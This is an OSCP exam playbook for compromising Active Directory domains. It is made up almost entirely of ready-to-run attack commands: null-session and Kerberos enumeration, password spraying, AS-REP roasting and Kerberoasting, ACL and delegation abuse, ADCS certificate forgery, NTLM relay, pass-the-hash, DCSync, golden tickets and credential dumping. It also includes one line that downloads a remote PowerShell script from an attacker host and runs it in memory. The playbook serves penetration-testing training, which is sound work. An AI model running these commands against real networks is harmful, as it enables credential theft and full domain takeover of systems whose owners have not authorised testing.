# Active Directory — OSCP Playbook

A chronological methodology for attacking AD environments on the OSCP exam and labs. Work top-down: do the unauthenticated checks first, then re-run authenticated checks every time you gain a new credential.

---

## Table of Contents
1. [Methodology (Chronological)](#methodology-chronological)
2. [Tools — Commands & Flags](#tools--commands--flags)
3. [Finding the Inputs (DN, Domain, DC, etc.)](#finding-the-inputs-dn-domain-dc-etc)
4. [BloodHound — Setup, Collection, Queries](#bloodhound--setup-collection-queries)
5. [Common OSCP Attack Paths](#common-oscp-attack-paths)
6. [Lateral Movement Cheatsheet](#lateral-movement-cheatsheet)
7. [Post-Exploitation — Dumping Secrets](#post-exploitation--dumping-secrets)
8. [Quick Reference — "I got a cred, now what?"](#quick-reference--i-got-a-cred-now-what)

---

## Methodology (Chronological)

Run these phases **in order**. Each new credential or hash resets you back to Phase 3 with the new identity.

### Phase 1 — Network Recon
1. Full TCP scan to identify the DC:
   ```bash
   nmap -p- --min-rate 5000 -oA scans/all-tcp <IP>
   nmap -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389 -oA scans/ad <IP>
   ```
2. From the nmap output, capture:
   - **Domain name** (FQDN) — appears in LDAP/Kerberos/SMB script output
   - **Hostname / DC name** — `smb-os-discovery`, `nbstat`, LDAP rootDSE
   - **Domain SID** — `lsaquery` (later)
3. Add to `/etc/hosts`:
   ```
   <IP>  dc01.corp.local corp.local dc01
   ```

### Phase 2 — Unauthenticated Enumeration (no creds)

**Order matters — do each one even if the previous failed.**

1. **SMB null / guest session**
   ```bash
   nxc smb <IP> -u '' -p ''                       # null
   nxc smb <IP> -u 'guest' -p ''                  # guest
   nxc smb <IP> -u '' -p '' --shares
   nxc smb <IP> -u '' -p '' --users               # null user enum
   nxc smb <IP> -u '' -p '' --rid-brute 10000     # RID brute (gold mine)
   smbclient -L //<IP>/ -N
   smbmap -H <IP> -u null
   enum4linux-ng -A <IP>
   ```

2. **LDAP anonymous bind**
   ```bash
   ldapsearch -x -H ldap://<IP> -s base namingcontexts     # find base DN
   ldapsearch -x -H ldap://<IP> -b "DC=corp,DC=local"      # full dump if anon allowed
   nxc ldap <IP> -u '' -p ''                               # quick check
   ```

3. **RPC anonymous**
   ```bash
   rpcclient -U "" -N <IP>
   # inside: enumdomusers, enumdomgroups, querydominfo, lookupnames <user>, lookupsids <SID>
   ```

4. **Kerberos username enumeration** (no creds, no lockouts)
   ```bash
   kerbrute userenum -d corp.local --dc <IP> /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
   ```

5. **AS-REP Roasting** (any user with `DONT_REQ_PREAUTH`)
   ```bash
   impacket-GetNPUsers corp.local/ -dc-ip <IP> -usersfile users.txt -no-pass -format hashcat -outputfile asrep.hash
   hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt
   ```

6. **Password spraying** (with `users.txt` from RID brute or kerbrute)
   ```bash
   nxc smb <IP> -u users.txt -p 'Welcome1' --continue-on-success
   nxc smb <IP> -u users.txt -p users.txt --no-bruteforce --continue-on-success    # username-as-password
   kerbrute passwordspray -d corp.local --dc <IP> users.txt 'Spring2024!'
   ```
   **Always check the domain password policy first** (`nxc smb <IP> -u user -p pass --pass-pol`) — lockout = exam over.

### Phase 3 — Authenticated Enumeration (have user creds)
Once you have any cred, **immediately**:
1. Validate + scope:
   ```bash
   nxc smb <IP-RANGE> -u 'svc_user' -p 'Password1'           # where else does it work?
   nxc smb <IP> -u 'svc_user' -p 'Password1' --shares --users --groups --pass-pol --loggedon-users --sessions
   nxc winrm <IP> -u 'svc_user' -p 'Password1'               # WinRM allowed?
   nxc smb <IP> -u 'svc_user' -p 'Password1' --local-auth    # local account? (not domain)
   ```
2. Kerberoast (any authenticated user can do this):
   ```bash
   impacket-GetUserSPNs corp.local/svc_user:'Password1' -dc-ip <IP> -request -outputfile spns.hash
   hashcat -m 13100 spns.hash /usr/share/wordlists/rockyou.txt
   ```
3. AS-REP roast with this user's view:
   ```bash
   impacket-GetNPUsers corp.local/svc_user:'Password1' -dc-ip <IP> -request -format hashcat
   ```
4. LDAP dump:
   ```bash
   ldapdomaindump -u 'corp.local\svc_user' -p 'Password1' <IP> -o ldapdump
   nxc ldap <IP> -u svc_user -p 'Password1' --users --groups --asreproast asrep.out --kerberoasting kerb.out
   ```
5. Share hunting (look for creds in scripts, configs, `Groups.xml`):
   ```bash
   nxc smb <IP> -u svc_user -p 'Password1' -M spider_plus
   smbmap -H <IP> -u svc_user -p 'Password1' -R --depth 5
   ```
6. **Run BloodHound** (see [BloodHound](#bloodhound--setup-collection-queries))
7. Check GPP passwords in SYSVOL:
   ```bash
   smbclient //<IP>/SYSVOL -U svc_user%'Password1' -c 'recurse;ls'
   # look for Groups.xml with cpassword=
   gpp-decrypt <cpassword>
   ```

### Phase 4 — Privilege / Path Analysis
With BloodHound loaded and your user marked **Owned**:
- Run **"Shortest Paths from Owned Principals"**
- Run **"Find Principals with DCSync Rights"**
- Check user's outbound object control (GenericAll, WriteDACL, ForceChangePassword, AddMember)
- Check if user is **local admin** anywhere (`AdminTo` edge)
- Check delegations (Unconstrained, Constrained, RBCD)
- Check for **ADCS** (look for `CertSrv` web endpoint, `pKIEnrollmentService` LDAP object) → run **Certipy**

### Phase 5 — Execute Path → Lateral → Repeat
- Move laterally, dump secrets on each box (`secretsdump`, LSA, SAM)
- Each new hash/password resets to Phase 3
- Goal: DCSync → `krbtgt` hash → Golden Ticket, OR direct DA, OR `Administrator` NT hash → PTH to DC

---

## Tools — Commands & Flags

### `nxc` (NetExec — successor to CrackMapExec)
The single most useful AD tool. Protocols: `smb`, `ldap`, `winrm`, `mssql`, `rdp`, `ssh`, `wmi`, `ftp`.

```bash
nxc smb <target> -u <user> -p <pass>                       # auth check (✓ = valid, Pwn3d! = local admin)
nxc smb <target> -u <user> -H <NThash>                     # pass-the-hash
nxc smb <target> -u <user> -p <pass> --local-auth          # local account (not domain)
nxc smb <target> -u <user> -p <pass> --shares              # list shares + perms
nxc smb <target> -u <user> -p <pass> --users               # domain users
nxc smb <target> -u <user> -p <pass> --groups              # domain groups
nxc smb <target> -u <user> -p <pass> --rid-brute           # SID-based user enum (no creds needed often)
nxc smb <target> -u <user> -p <pass> --pass-pol            # password policy (CHECK BEFORE SPRAYING)
nxc smb <target> -u <user> -p <pass> --loggedon-users      # who's logged in (helps target Kerberoast)
nxc smb <target> -u <user> -p <pass> --sessions            # active sessions
nxc smb <target> -u <user> -p <pass> --sam                 # dump SAM (need local admin)
nxc smb <target> -u <user> -p <pass> --lsa                 # dump LSA secrets (need local admin)
nxc smb <target> -u <user> -p <pass> --ntds                # dump NTDS.dit (need DA, run vs DC)
nxc smb <target> -u <user> -p <pass> -x 'whoami /all'      # command exec (local admin)
nxc smb <target> -u <user> -p <pass> -M <module>           # modules: spider_plus, gpp_password, lsassy, etc.

nxc ldap <target> -u <user> -p <pass> --kerberoasting out.hash
nxc ldap <target> -u <user> -p <pass> --asreproast out.hash
nxc ldap <target> -u <user> -p <pass> --trusted-for-delegation
nxc ldap <target> -u <user> -p <pass> --password-not-required
nxc ldap <target> -u <user> -p <pass> --admin-count        # AdminSDHolder protected (privileged)
nxc ldap <target> -u <user> -p <pass> --bloodhound --collection All --dns-server <IP>
```

**Flags worth memorizing:** `-u user`, `-p pass`, `-H hash`, `--local-auth`, `--continue-on-success`, `-d domain`, `-k` (Kerberos auth).

### Impacket Suite
```bash
impacket-GetNPUsers   corp.local/ -usersfile users.txt -dc-ip <IP> -no-pass -format hashcat       # AS-REP roast
impacket-GetUserSPNs  corp.local/user:pass -dc-ip <IP> -request                                   # Kerberoast
impacket-secretsdump  corp.local/user:pass@<IP>                                                   # remote SAM/LSA/NTDS
impacket-secretsdump  -just-dc corp.local/Administrator@<DC>                                      # DCSync (need rights)
impacket-secretsdump  -ntds /path/NTDS.dit -system /path/SYSTEM LOCAL                             # offline NTDS parse
impacket-psexec       corp.local/user:pass@<IP>                                                   # SYSTEM shell, noisy
impacket-smbexec      corp.local/user:pass@<IP>                                                   # similar, semi-interactive
impacket-wmiexec      corp.local/user:pass@<IP>                                                   # cleaner, user context
impacket-atexec       corp.local/user:pass@<IP> 'whoami'                                          # via scheduled task
impacket-mssqlclient  corp.local/user:pass@<IP> -windows-auth
impacket-ticketer     -nthash <krbtgt-hash> -domain-sid <SID> -domain corp.local Administrator    # Golden ticket
impacket-getST        -spn cifs/dc01 -impersonate Administrator corp.local/user:pass              # S4U for delegation
impacket-ntlmrelayx   -t smb://<target> -smb2support                                              # relay
```

**Auth syntax for impacket:** `domain/user:password@target` or `domain/user@target -hashes :NTHASH` or `-k -no-pass` (Kerberos with ccache).

### Kerberos / Kerbrute
```bash
kerbrute userenum     -d corp.local --dc <IP> users.txt
kerbrute passwordspray -d corp.local --dc <IP> users.txt 'Password1'
kerbrute bruteuser    -d corp.local --dc <IP> wordlist.txt <user>
```

### LDAP
```bash
ldapsearch -x -H ldap://<IP> -s base namingcontexts                              # find base DN (anonymous)
ldapsearch -x -H ldap://<IP> -b 'DC=corp,DC=local' '(objectClass=user)' sAMAccountName description
ldapsearch -x -H ldap://<IP> -D 'svc_user@corp.local' -w 'Password1' -b 'DC=corp,DC=local'
ldapsearch -x -H ldap://<IP> -D 'svc_user@corp.local' -w 'Password1' \
  -b 'DC=corp,DC=local' '(servicePrincipalName=*)' sAMAccountName servicePrincipalName     # find SPNs
ldapdomaindump -u 'corp.local\svc_user' -p 'Password1' <IP> -o ldapdump
windapsearch --dc-ip <IP> -d corp.local -u svc_user -p 'Password1' -m users
```

### SMB
```bash
smbclient -L //<IP>/ -N                                       # list shares, null
smbclient //<IP>/SHARE -U 'svc_user%Password1'                # connect
smbclient //<IP>/SHARE -U 'svc_user%Password1' -c 'recurse;prompt;mget *'
smbmap -H <IP> -u svc_user -p 'Password1' -R SHARE --depth 5
smbmap -H <IP> -u svc_user -p 'Password1' -x 'whoami'         # exec
```

### Evil-WinRM
```bash
evil-winrm -i <IP> -u svc_user -p 'Password1'
evil-winrm -i <IP> -u svc_user -H <NThash>                    # PTH
# Useful inside: upload, download, menu, Bypass-4MSI, Invoke-Binary, IEX(IWR ...)
```

### BloodHound Collectors
```bash
bloodhound-python -d corp.local -u svc_user -p 'Password1' -ns <DC-IP> -c All --zip
# Windows side:
.\SharpHound.exe -c All --zipfilename loot
# As PS:
. .\SharpHound.ps1 ; Invoke-BloodHound -CollectionMethod All -ZipFileName loot
```

### Certipy (ADCS)
```bash
certipy find -u svc_user@corp.local -p 'Password1' -dc-ip <IP> -vulnerable -stdout
certipy req  -u svc_user@corp.local -p 'Password1' -ca CORP-CA -template VulnTemplate -upn administrator@corp.local
certipy auth -pfx administrator.pfx -dc-ip <IP>
```

### Hashcat Modes (memorize)
| Hash | Mode |
|---|---|
| NTLM | `1000` |
| NetNTLMv2 | `5600` |
| Kerberos AS-REP (etype 23) | `18200` |
| Kerberos TGS (Kerberoast, etype 23) | `13100` |
| LM | `3000` |
| DCC2 (cached domain creds) | `2100` |

---

## Finding the Inputs (DN, Domain, DC, etc.)

Most LDAP/Kerberos commands need values you don't have yet. Here's how to derive them:

### Base DN (`DC=corp,DC=local`)
```bash
ldapsearch -x -H ldap://<IP> -s base namingcontexts
# returns: namingcontexts: DC=corp,DC=local
nmap -p 389 --script ldap-rootdse <IP>
nxc ldap <IP> -u '' -p ''                  # banner includes domain
```
Or convert FQDN by hand: `corp.local` → `DC=corp,DC=local`.

### Domain FQDN (`corp.local`)
- `nmap -sC` SMB output: `Domain: corp.local`
- `nxc smb <IP>` banner
- `enum4linux-ng -A <IP>`
- Kerberos error from `kinit`

### DC Hostname (`dc01.corp.local`)
- `nmap --script smb-os-discovery -p 445 <IP>`
- `nxc smb <IP>` (left column shows name)
- LDAP rootDSE `dnsHostName` attribute

### Domain SID (`S-1-5-21-...`)
```bash
nxc smb <IP> -u svc_user -p 'Password1' --rid-brute | head
lookupsids <SID> in rpcclient
impacket-lookupsid corp.local/svc_user:'Password1'@<IP>
```

### User List (when you have no users)
- `--rid-brute` via nxc (often works with null/guest)
- `kerbrute userenum` with seclists
- LDAP anonymous if allowed
- `enum4linux-ng`
- Web app recon (employee names → firstname.lastname format)

### Time Sync (Kerberos requires <5 min skew)
```bash
sudo ntpdate <DC-IP>
sudo rdate -n <DC-IP>
# or sync clock from DC:
sudo timedatectl set-ntp false && sudo date -s "$(net time -S <DC-IP> | awk -F'is ' '{print $2}')"
```

### `/etc/hosts` (almost always required for Kerberos)
```
<IP>  dc01.corp.local corp.local dc01
```

---

## BloodHound — Setup, Collection, Queries

### Setup (Kali — use BloodHound CE, not legacy)
```bash
# Legacy BloodHound (still on OSCP exam image as of 2026):
sudo neo4j console                                   # start neo4j on :7474, bolt :7687
# default creds neo4j/neo4j → change to neo4j/bloodhound
bloodhound &                                         # GUI

# BloodHound CE (preferred if you have it):
sudo docker compose -f bloodhound-cli/docker-compose.yml up -d
# UI: http://localhost:8080 — random admin pw printed on first run
```

### Collection
```bash
# From Kali (no domain join needed):
bloodhound-python -d corp.local -u svc_user -p 'Password1' -ns <DC-IP> -c All --zip
# Output: <timestamp>_bloodhound.zip — drag into the GUI

# From Windows foothold:
.\SharpHound.exe -c All,GPOLocalGroup --zipfilename loot
# or PS:
IEX (New-Object Net.WebClient).DownloadString('http://<KALI>/SharpHound.ps1')
Invoke-BloodHound -CollectionMethod All -ZipFileName loot
```

**Collection methods to know:**
- `All` — default; gets group membership, ACLs, sessions, trusts, local admin
- `DCOnly` — LDAP-only, quiet, no SMB to workstations
- `GPOLocalGroup` — local admin via GPO (often catches stuff All misses)
- `LoggedOn` — needs admin to query Win32 API, but precise

### Loading Data
- Drag the `.zip` into the BloodHound window (legacy) or use **Upload** in CE
- Wait for ingest to finish before querying

### Marking Things as Owned / High Value
- Right-click a node → **Mark User as Owned** (sets `owned: true`)
- Right-click → **Mark User as High Value** (e.g., a service account with juicy access)
- Owned nodes are starting points for "Shortest Paths from Owned" — **mark every cred you get**

Or set via Cypher (faster for many):
```cypher
MATCH (u:User {name:"SVC_USER@CORP.LOCAL"}) SET u.owned=true
MATCH (u:User) WHERE u.name IN ["A@CORP.LOCAL","B@CORP.LOCAL"] SET u.owned=true
```

### Best Cypher Queries

**Pre-built (run from "Analysis" tab):**
- Shortest Paths from Owned Principals
- Shortest Paths to Domain Admins from Owned Principals
- Find Principals with DCSync Rights
- Find Computers with Unconstrained Delegation
- Find Kerberoastable Users
- Find AS-REP Roastable Users (DontReqPreAuth)
- Shortest Paths to High Value Targets

**Custom Cypher (paste in Raw Query bar):**

Kerberoastable users with paths to high value:
```cypher
MATCH (u:User {hasspn:true}) MATCH p=shortestPath((u)-[*1..]->(t {highvalue:true})) RETURN p
```

Users with description set (often holds passwords):
```cypher
MATCH (u:User) WHERE u.description IS NOT NULL AND u.description <> "" RETURN u.name, u.description
```

Computers where my user is local admin:
```cypher
MATCH (u:User {name:"SVC_USER@CORP.LOCAL"})-[:AdminTo|MemberOf*1..]->(c:Computer) RETURN DISTINCT c.name
```

All outbound rights from my owned users:
```cypher
MATCH p=(u:User {owned:true})-[r:GenericAll|GenericWrite|WriteDacl|WriteOwner|ForceChangePassword|AddMember|AllExtendedRights]->(n) RETURN p
```

Find shortest path from any owned to Domain Admins:
```cypher
MATCH (u {owned:true}), (g:Group) WHERE g.name =~ "DOMAIN ADMINS@.*" MATCH p=shortestPath((u)-[*1..]->(g)) RETURN p
```

Users that haven't changed password in >1yr (stale, often weak):
```cypher
MATCH (u:User) WHERE u.pwdlastset < (datetime().epochSeconds - 31536000) AND u.enabled=true RETURN u.name, u.pwdlastset ORDER BY u.pwdlastset
```

Computers without LAPS:
```cypher
MATCH (c:Computer {haslaps:false, enabled:true}) RETURN c.name
```

Find unconstrained delegation (non-DC):
```cypher
MATCH (c:Computer {unconstraineddelegation:true}) WHERE NOT c.name CONTAINS "DC" RETURN c.name
```

Sessions of high-value users (where to hunt their tokens):
```cypher
MATCH (u:User {highvalue:true})-[:HasSession]->(c:Computer) RETURN u.name, c.name
```

---

## Common OSCP Attack Paths

For each: **how to detect → how to exploit → what you get.**

### 1. AS-REP Roasting (`DONT_REQ_PREAUTH`)
- **Detect:** BH "Find AS-REP Roastable Users", or `nxc ldap <IP> -u u -p p --asreproast out`, or LDAP filter `(userAccountControl:1.2.840.113556.1.4.803:=4194304)`
- **Exploit:**
  ```bash
  impacket-GetNPUsers corp.local/ -usersfile users.txt -no-pass -dc-ip <IP> -format hashcat -outputfile asrep.hash
  hashcat -m 18200 asrep.hash rockyou.txt
  ```
- **Yields:** plaintext password of that user (if crackable).

### 2. Kerberoasting (SPN on a user account)
- **Detect:** BH "Find Kerberoastable Users". Service accounts have SPNs; `krbtgt` is filtered out.
- **Exploit:**
  ```bash
  impacket-GetUserSPNs corp.local/svc_user:'Password1' -dc-ip <IP> -request -outputfile spns.hash
  hashcat -m 13100 spns.hash rockyou.txt
  ```
- **Yields:** plaintext password of the service account. Often a path to high privilege (SQL svc → MSSQL, backup svc → Backup Operators, etc.).

### 3. GenericAll / GenericWrite / WriteDACL on a USER
- **Detect:** BH outbound edges from owned user
- **Exploit — force change password (no need to know current):**
  ```bash
  net rpc password "victimuser" "NewPass123!" -U "corp.local/attacker%Password1" -S <DC>
  # or:
  bloodyAD --host <DC> -d corp.local -u attacker -p 'Password1' set password victimuser 'NewPass123!'
  # or PowerView (Windows):
  Set-DomainUserPassword -Identity victim -AccountPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force)
  ```
- **Or Shadow Credentials (stealthier — works on GenericWrite, no password change):**
  ```bash
  certipy shadow auto -u attacker@corp.local -p 'Password1' -account victim -dc-ip <IP>
  ```
- **Yields:** ability to log in as victim.

### 4. GenericAll / AddMember on a GROUP
- **Exploit:**
  ```bash
  net rpc group addmem "Domain Admins" attacker -U "corp.local/attacker%Password1" -S <DC>
  bloodyAD --host <DC> -d corp.local -u attacker -p 'Password1' add groupMember "Domain Admins" attacker
  ```
- **Yields:** group membership (re-auth to get new TGT).

### 5. ForceChangePassword
- Same as GenericAll write-password, but limited to password reset. Use `net rpc password` or `bloodyAD set password`.

### 6. GPP Passwords in SYSVOL (cpassword)
- **Detect:**
  ```bash
  nxc smb <IP> -u u -p p -M gpp_password
  smbclient //<IP>/SYSVOL -U u%p
  # find Groups.xml, ScheduledTasks.xml, Services.xml
  ```
- **Exploit:** Microsoft-published the AES key → trivially decryptable.
  ```bash
  gpp-decrypt 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ'
  ```
- **Yields:** plaintext local/domain password.

### 7. LAPS Read (ms-Mcs-AdmPwd)
- **Detect:** BH "Find computers without LAPS" inverse; user has `ReadLAPSPassword` edge.
- **Exploit:**
  ```bash
  nxc ldap <IP> -u u -p p -M laps
  pyLAPS.py --action get -u u -p p -d corp.local --dc-ip <IP>
  ```
- **Yields:** local Administrator password on that machine → PTH/login.

### 8. Unconstrained Delegation
- **Detect:** BH "Find Computers with Unconstrained Delegation"
- **Exploit:** Coerce a privileged account (often DC computer account) to auth to your machine → capture TGT from memory → PTT.
  ```bash
  # On compromised UD computer:
  Rubeus.exe monitor /interval:5
  # Coerce from Kali:
  printerbug.py corp.local/u:p@<DC> <UD-host>
  PetitPotam.py -u u -p p -d corp.local <UD-host> <DC>
  ```
- **Yields:** DC TGT → DCSync → Golden.

### 9. Constrained Delegation (S4U2Self + S4U2Proxy)
- **Detect:** user/computer has `msDS-AllowedToDelegateTo` set.
- **Exploit:**
  ```bash
  impacket-getST -spn cifs/dc01.corp.local -impersonate Administrator -dc-ip <IP> corp.local/svc_account:'Password1'
  export KRB5CCNAME=Administrator.ccache
  impacket-secretsdump -k -no-pass corp.local/Administrator@dc01.corp.local
  ```

### 10. Resource-Based Constrained Delegation (RBCD)
- **Detect:** you have GenericWrite or GenericAll on a computer object (BH edge).
- **Exploit:**
  ```bash
  impacket-addcomputer corp.local/u:'Password1' -computer-name 'ATK$' -computer-pass 'Pass123!' -dc-ip <IP>
  impacket-rbcd -delegate-from 'ATK$' -delegate-to 'VICTIM$' -dc-ip <IP> -action write corp.local/u:'Password1'
  impacket-getST -spn cifs/victim.corp.local -impersonate Administrator -dc-ip <IP> corp.local/'ATK$':'Pass123!'
  export KRB5CCNAME=Administrator.ccache
  impacket-wmiexec -k -no-pass corp.local/Administrator@victim.corp.local
  ```
- **Yields:** SYSTEM on the target computer.
- **Note:** MachineAccountQuota default = 10 (any user can add a computer).

### 11. DCSync (DS-Replication-Get-Changes-All)
- **Detect:** BH "Find Principals with DCSync Rights" (user has both `GetChanges` + `GetChangesAll`).
- **Exploit:**
  ```bash
  impacket-secretsdump -just-dc corp.local/u:'Password1'@<DC>
  # Or just one user:
  impacket-secretsdump -just-dc-user 'Administrator' corp.local/u:'Password1'@<DC>
  ```
- **Yields:** every NTLM hash incl. `krbtgt` → Golden Ticket → game over.

### 12. ADCS (ESC1–ESC11)
- **Detect:**
  ```bash
  certipy find -u u@corp.local -p 'Password1' -dc-ip <IP> -vulnerable -stdout
  ```
- **ESC1 exploit (template allows `ENROLLEE_SUPPLIES_SUBJECT` + ClientAuth EKU):**
  ```bash
  certipy req  -u u@corp.local -p 'Password1' -ca CORP-CA -template VulnTpl -upn administrator@corp.local
  certipy auth -pfx administrator.pfx -dc-ip <IP>           # returns NT hash + TGT
  ```
- **Yields:** TGT + NT hash of any user (often Administrator).

### 13. Pass-the-Hash (NTLM)
- Any tool with `-H` or `-hashes`:
  ```bash
  nxc smb <IP> -u Administrator -H aad3b...:31d6c...
  evil-winrm -i <IP> -u Administrator -H 31d6c...
  impacket-psexec corp.local/Administrator@<IP> -hashes :31d6c...
  ```

### 14. Pass-the-Ticket
```bash
export KRB5CCNAME=/path/to/ticket.ccache
impacket-wmiexec -k -no-pass corp.local/Administrator@dc01.corp.local
```

### 15. SMB Signing Disabled → NTLM Relay
- **Detect:**
  ```bash
  nxc smb <RANGE> --gen-relay-list relay-targets.txt
  ```
- **Exploit (with mitm6 or PetitPotam):**
  ```bash
  # Terminal 1:
  impacket-ntlmrelayx -tf relay-targets.txt -smb2support -socks
  # Terminal 2 — IPv6 poisoning (most common):
  mitm6 -d corp.local
  # Or coerce explicitly:
  PetitPotam.py -u guest -p '' -d corp.local <listener-IP> <target>
  ```
- **Yields:** auth as the relayed account (often a computer/admin) → dump SAM → local admin.

### 16. Password Reuse (most common OSCP path!)
Every time you crack/dump a password:
```bash
nxc smb <RANGE> -u <user> -p <pass>                    # try domain
nxc smb <RANGE> -u <user> -p <pass> --local-auth       # try as local
nxc smb <RANGE> -u userlist.txt -p <pass>              # spray same pw across users
```

---

## Lateral Movement Cheatsheet

| You have | Tool | Command |
|---|---|---|
| Local admin (pw) | psexec | `impacket-psexec corp.local/u:p@<IP>` |
| Local admin (hash) | psexec | `impacket-psexec corp.local/u@<IP> -hashes :NT` |
| Local admin, want quiet | wmiexec | `impacket-wmiexec corp.local/u:p@<IP>` |
| WinRM allowed | evil-winrm | `evil-winrm -i <IP> -u u -p p` |
| WinRM + hash | evil-winrm | `evil-winrm -i <IP> -u u -H NT` |
| SMB shell, semi-interactive | smbexec | `impacket-smbexec corp.local/u:p@<IP>` |
| Just want to run a cmd | atexec | `impacket-atexec corp.local/u:p@<IP> 'whoami'` |
| RDP | xfreerdp | `xfreerdp /v:<IP> /u:u /p:p /d:corp.local /dynamic-resolution` |
| RDP + hash (Restricted Admin) | xfreerdp | `xfreerdp /v:<IP> /u:u /pth:NT /d:corp.local` |
| MSSQL | mssqlclient | `impacket-mssqlclient corp.local/u:p@<IP> -windows-auth` then `enable_xp_cmdshell` |

**Determine which works first** with `nxc smb <IP> -u u -p p` (Pwn3d!) and `nxc winrm <IP> -u u -p p`.

---

## Post-Exploitation — Dumping Secrets

Once you are local admin / SYSTEM on any host:

```bash
# Remote (from Kali):
impacket-secretsdump corp.local/u:p@<IP>                          # SAM + LSA + cached
impacket-secretsdump -sam SAM -system SYSTEM LOCAL                # offline parse
nxc smb <IP> -u u -p p --sam --lsa
nxc smb <IP> -u u -p p -M lsassy                                  # LSASS extraction (creds in memory)

# DC only (need DCSync rights or DA):
impacket-secretsdump -just-dc corp.local/Administrator@<DC>
impacket-secretsdump -just-dc-ntlm corp.local/Administrator@<DC>  # NTLM only, faster

# On Windows (manual):
reg save HKLM\SAM C:\Windows\Temp\sam.save
reg save HKLM\SECURITY C:\Windows\Temp\security.save
reg save HKLM\SYSTEM C:\Windows\Temp\system.save
# Download, then:
impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL
```

**After NTDS dump → crack with hashcat -m 1000, or PTH directly.**

---

## Quick Reference — "I got a cred, now what?"

Run **this sequence** every single time a new credential drops:

```bash
USER='svc_user'; PASS='Password1'; DOMAIN='corp.local'; DC='<DC-IP>'; RANGE='<subnet>'

# 1. Where does it work?
nxc smb $RANGE -u $USER -p "$PASS" --continue-on-success
nxc winrm $RANGE -u $USER -p "$PASS" --continue-on-success
nxc smb $RANGE -u $USER -p "$PASS" --local-auth --continue-on-success

# 2. What can it see?
nxc smb $DC -u $USER -p "$PASS" --shares --users --groups --pass-pol --loggedon-users
nxc smb $DC -u $USER -p "$PASS" -M spider_plus
nxc smb $DC -u $USER -p "$PASS" -M gpp_password

# 3. Roast everything
impacket-GetUserSPNs $DOMAIN/$USER:"$PASS" -dc-ip $DC -request -outputfile kerb.hash
impacket-GetNPUsers  $DOMAIN/$USER:"$PASS" -dc-ip $DC -request -format hashcat -outputfile asrep.hash
hashcat -m 13100 kerb.hash rockyou.txt
hashcat -m 18200 asrep.hash rockyou.txt

# 4. BloodHound — mark this user owned, re-run analysis
bloodhound-python -d $DOMAIN -u $USER -p "$PASS" -ns $DC -c All --zip

# 5. ADCS?
certipy find -u $USER@$DOMAIN -p "$PASS" -dc-ip $DC -vulnerable -stdout

# 6. Any local admin? secretsdump it.
# 7. DCSync rights? secretsdump -just-dc.
```

**If stuck:** check shares for scripts/configs with embedded creds, check user description fields in LDAP, re-run BloodHound with new ownership marked, look for password reuse across local accounts.
